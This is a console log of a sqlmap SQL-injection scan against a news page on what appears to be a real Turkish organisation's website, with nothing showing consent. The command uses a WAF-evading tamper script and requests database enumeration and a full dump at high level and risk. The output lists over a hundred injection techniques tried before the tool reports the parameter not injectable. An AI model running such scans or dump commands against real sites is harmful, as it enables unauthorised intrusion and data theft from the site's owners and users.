C:\Users\burak\OneDrive\Masaüstü\asdas\sqlmap-dev>python sqlmap.py -u "https://www.mustso.org.tr/Bas%C4%B1ndaBiz/Haber/tabid/17222/articleType/ArticleView/articleId/41518/Hayirli-Ramazanlar.aspx" --data="*"  --tamper="space2comment" --dbs --level 3 --risk 3 --dump --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.8.3#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:43:16 /2022-08-25/

[22:43:16] [INFO] loading tamper module 'space2comment'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[22:43:17] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=oWOrwEzv2AE...kZTdhYzhm0;Article41518=1;language=en-US'). Do you want to use those [Y/n] Y
[22:43:18] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[22:43:18] [INFO] testing if the target URL content is stable
[22:43:18] [INFO] target URL content is stable
[22:43:18] [INFO] testing if (custom) POST parameter '#1*' is dynamic
[22:43:19] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
[22:43:20] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable
[22:43:21] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
[22:43:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:43:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[22:44:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[22:44:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[22:44:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[22:45:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[22:45:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[22:45:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[22:45:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[22:45:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[22:45:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[22:46:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[22:46:18] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[22:46:30] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[22:46:48] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[22:47:24] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[22:47:42] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[22:48:18] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[22:48:43] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[22:49:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:49:18] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[22:49:19] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[22:49:19] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[22:49:20] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[22:49:20] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[22:49:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[22:49:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[22:49:22] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[22:49:22] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[22:49:23] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[22:49:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[22:49:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[22:49:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[22:49:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[22:49:26] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[22:49:27] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[22:49:45] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[22:49:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[22:49:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:50:08] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:50:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:50:50] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:51:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[22:51:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[22:51:41] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:51:51] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[22:52:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:52:19] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[22:52:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:52:40] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[22:52:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[22:53:09] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[22:53:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[22:53:39] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[22:53:56] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:54:06] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
[22:54:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[22:54:42] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[22:55:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[22:55:17] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[22:55:27] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
[22:55:37] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
[22:56:17] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
[22:56:42] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
[22:56:53] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[22:57:04] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[22:57:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[22:57:20] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[22:57:21] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[22:57:21] [INFO] testing 'Oracle error-based - Parameter replace'
[22:57:21] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[22:57:22] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[22:57:23] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[22:57:31] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[22:57:37] [INFO] testing 'Generic inline queries'
[22:57:38] [INFO] testing 'MySQL inline queries'
[22:57:38] [INFO] testing 'PostgreSQL inline queries'
[22:57:39] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[22:57:39] [INFO] testing 'Oracle inline queries'
[22:57:40] [INFO] testing 'SQLite inline queries'
[22:57:40] [INFO] testing 'Firebird inline queries'
[22:57:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:57:41] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[22:57:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[22:57:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[22:58:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[22:58:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:58:30] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[22:58:36] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[22:58:42] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:58:56] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[22:59:02] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:59:08] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[22:59:21] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
[22:59:35] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[22:59:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:59:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[23:00:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[23:00:18] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[23:00:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[23:00:46] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[23:00:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[23:01:07] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[23:01:15] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[23:01:28] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[23:01:49] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[23:02:26] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[23:02:39] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[23:02:54] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[23:03:14] [INFO] testing 'MySQL AND time-based blind (ELT)'
[23:03:29] [INFO] testing 'MySQL OR time-based blind (ELT)'
[23:03:49] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[23:04:11] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[23:04:24] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[23:04:45] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[23:05:07] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[23:05:22] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[23:05:36] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)'
[23:06:05] [INFO] testing 'Oracle AND time-based blind'
[23:06:18] [INFO] testing 'Oracle OR time-based blind'
[23:06:48] [INFO] testing 'Oracle AND time-based blind (heavy query)'
[23:07:11] [INFO] testing 'Oracle OR time-based blind (heavy query)'
[23:07:26] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'
[23:07:40] [INFO] testing 'IBM DB2 OR time-based blind (heavy query)'
[23:08:10] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[23:08:31] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[23:08:44] [INFO] testing 'Informix AND time-based blind (heavy query)'
[23:08:58] [INFO] testing 'Informix OR time-based blind (heavy query)'
[23:09:14] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[23:09:51] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[23:09:51] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[23:09:52] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[23:09:52] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
[23:09:53] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
[23:09:54] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[23:09:55] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[23:09:57] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
[23:09:58] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[23:09:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[23:10:35] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[23:11:11] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[23:11:34] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[23:11:56] [WARNING] (custom) POST parameter '#1*' does not seem to be injectable
[23:11:56] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests

[*] ending @ 23:11:56 /2022-08-25/
